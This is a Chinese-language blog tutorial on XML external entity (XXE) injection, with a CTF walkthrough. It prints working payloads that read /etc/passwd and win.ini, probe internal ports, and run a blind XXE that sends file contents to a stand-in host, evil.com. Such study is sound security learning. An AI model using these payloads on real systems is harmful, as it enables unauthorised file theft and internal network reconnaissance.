<!DOCTYPE html>
<html lang="zh">
	<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Hu5k7&#39;s Blog
    </title>
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">

</head>
<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            XXE漏洞学习
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h1 id="0x00-前言">0x00 前言</h1>
<p>最近看到挺多XXE漏洞的，于是打算来浅入学习下。</p>
<h1 id="0x01漏洞产生">0x01漏洞产生</h1>
<p>XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件和代码，造成<strong>任意文件读取</strong>、<strong>命令执行</strong>、<strong>内网端口扫描</strong>、<strong>攻击内网网站</strong>、<strong>发起Dos攻击</strong>等危害。</p>
<p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<h2 id="0x01-1-XML基础">0x01.1 XML基础</h2>
<p>要了解XXE漏洞，先要搞懂一定的基础知识，了解XML文档的基础组成。</p>
<p>XML 指可扩展标记语言（Extensible Markup Language）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XML 被设计用来传输和存储数据。</span><br><span class="line">HTML 被设计用来显示数据</span><br></pre></td></tr></table></figure>
<p>XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。</p>
<p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构</p>
<p>XML的语法规则：</p>
<ul>
<li>
<p>XML文档必须有一个根元素</p>
</li>
<li>
<p>XML元素都必须有一个关闭标签</p>
</li>
<li>
<p>XML标签对大小敏感</p>
</li>
<li>
<p>XML元素必须被正确的嵌套</p>
</li>
<li>
<p>XML属性值必须加引导</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">"18"</span>&gt;</span>　　<span class="comment">&lt;!--自定的根元素girl;age属性需要加引导--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span>　　<span class="comment">&lt;!--自定义的4个子元素，即girl对象的属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">face</span>&gt;</span>可爱的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的女孩<span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span>　　<span class="comment">&lt;!--根元素的闭合--&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="实体引用">实体引用</h3>
<p>在XML中，一些字符拥有特殊的意义。</p>
<p>如果把字符&quot;&lt;&quot;放在XML元素中，会发生错误，这是因为解释器会把它作为新元素的开始。</p>
<p><strong>例子:</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>
<p>为了避免这个错误，请用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &amp;lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在 XML 中，有 5 个预定义的实体引用：</p>
<table>
<thead>
<tr>
<th>&amp;lt</th>
<th>&lt;</th>
<th>小于号</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;gt</td>
<td>&gt;</td>
<td>大于号</td>
</tr>
<tr>
<td>&amp;amp</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&amp;apos</td>
<td>’</td>
<td>单引号</td>
</tr>
<tr>
<td>&amp;quot</td>
<td>&quot;</td>
<td>引号</td>
</tr>
</tbody>
</table>
<p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  　　&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述XML代码基本分为三个部分：</p>
<ul>
<li>第一部分是XML的声明；</li>
<li>第二部分是XML的DTD文档类型定义</li>
<li>第三部分是XML语句</li>
</ul>
<p>而外部实体攻击主要利用DTD的外部实体来进行注入的。</p>
<p>DTD有两种构建方式，分别为<strong>内部DTD声明</strong>和<strong>外部DTD声明</strong></p>
<blockquote>
<p>​	tips: DTD = Document Type Definition 简称</p>
</blockquote>
<p><strong>内部DTD声明：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
<p>实例：如上述代码</p>
<p><strong>外部DTD声明：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root-element SYSTEM "test.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>K<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>J<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ESHLkangi<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="0x02-XML简单用法">0x02 XML简单用法</h1>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure>
<p>外部实体:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>参数实体:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>实列演示:  除参数实体外实体+内部实体</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY name "nMask"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实列演示: 参数实体+外部实体</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">	%name;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p>
<p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p>
<p>外部实体 外部实体即在DTD中使用</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>实例演示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[ //定义一个外部名称</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;]&gt;</span> //SYSTEM "file:///xxxx" 用于读取文件</span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得带Content-Type: application/xml头，</p>
<p>如果请求头类似于：Content-Type: application/json，</p>
<p>那么可以改为Content-Type: application/xml试试有没有xml漏洞</p>
<h1 id="0x03-XXE漏洞实战">0x03 XXE漏洞实战</h1>
<p>题目地址：<a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">web.jarvisoj.com:9882</a></p>
<p><img src="1.PNG" alt="1"></p>
<p>我们抓包看一下</p>
<p><img src="2.PNG" alt="2"></p>
<p>现在我们尝试把 <strong>Content-Type: application/json</strong> 改成 <strong>application/xml</strong></p>
<p>发送以下内容探测是否存在XXE</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE TEST [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY xxe "XXE TEST"&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量</span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span> //乱取个名就好</span><br><span class="line">  &amp;xxe; //理解为引用变量地址输出</span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="3.PNG" alt="3"></p>
<p>读取文件测试</p>
<p><img src="4.PNG" alt="4"></p>
<p>读取flag测试</p>
<p><img src="5.PNG" alt="5"></p>
<h2 id="0x03-1-下面列出其他的用法">0x03.1 下面列出其他的用法</h2>
<p>XML文档是用PHP进行解析的，那么还可以使用php:*//filter协议来进行读取。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM "php://filter/resource=c:/windows/win.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>端口扫描 加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。 私有类型DTD加载：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">private_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">DTD_location</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>公共类型DTD加载：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">public_dtd</span> <span class="attr">PUBLIC</span> "<span class="attr">DTD_name</span>" "<span class="attr">DTD_location</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY portscan SYSTEM "http://localhost:3389"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;portscan;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>blind xxe漏洞: 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
<p>利用DTD进行数据回显 有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE root[    </span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % file SYSTEM "php://fileter/convert.base64-encode/resource=c:/windows/win.ini"&gt;     </span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % dtd SYSTEM "http://192.168.1.100:8000/evil.dtd"&gt;    </span></span><br><span class="line"><span class="meta"> %dtd;     </span></span><br><span class="line"><span class="meta"> %send;]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;"&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
<p>在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容</p>
<h1 id="0x04-参考链接">0x04 参考链接</h1>
<blockquote>
<p>我个人认为讲的最好的链接：</p>
<p><a href="http://xz.aliyun.com/t/6887" target="_blank" rel="noopener">http://xz.aliyun.com/t/6887</a></p>
<hr>
<p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p>
<p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a></p>
<p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p>
<p><a href="https://www.cnblogs.com/ESHLkangi/p/9245404.html" target="_blank" rel="noopener">https://www.cnblogs.com/ESHLkangi/p/9245404.html</a></p>
</blockquote>
<p><strong>转载请标明出处</strong></p>

    </div>
    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020  Hexo-Hijack.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
            
        </label>
    </p>
</div>
<input type="hidden" id="web_style" value="black">

<script src="/js/logo_title.js"></script>
<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>